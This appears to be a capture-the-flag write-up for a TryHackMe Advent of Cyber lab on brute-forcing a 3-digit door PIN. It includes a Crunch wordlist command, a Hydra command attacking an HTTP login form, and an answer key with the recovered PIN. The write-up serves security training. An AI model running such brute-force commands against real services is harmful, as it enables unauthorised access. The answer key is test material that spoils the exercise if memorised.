# Advent of Cyber 2023 - Day 3: Brute-Forcing

{% embed url="https://tryhackme.com/room/adventofcyber2023" %}

## Background
Password complexity, dictionary generation with **Crunch**, and online service brute-forcing with **Hydra** against a 3-digit digital door PIN.

## Walkthrough
1. The target door lock web interface accepts a 3-digit numeric code (`000` to `999`).
2. Generate all 3-digit permutations with Crunch:
   ```bash
   crunch 3 3 0123456789 -o pins.txt
   ```
3. Use Hydra to brute-force the HTTP POST form:
   ```bash
   hydra -l admin -P pins.txt TARGET_IP http-post-form "/login.php:pin=^PASS^:Invalid PIN"
   ```
4. Hydra discovers the valid code: `628`.
5. Enter `628` into the control panel to open the storage vault and recover Santa's backup tapes.

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| Total permutations for a 3-digit decimal PIN? | `1000` |
| Recovered door lock PIN? | `628` |
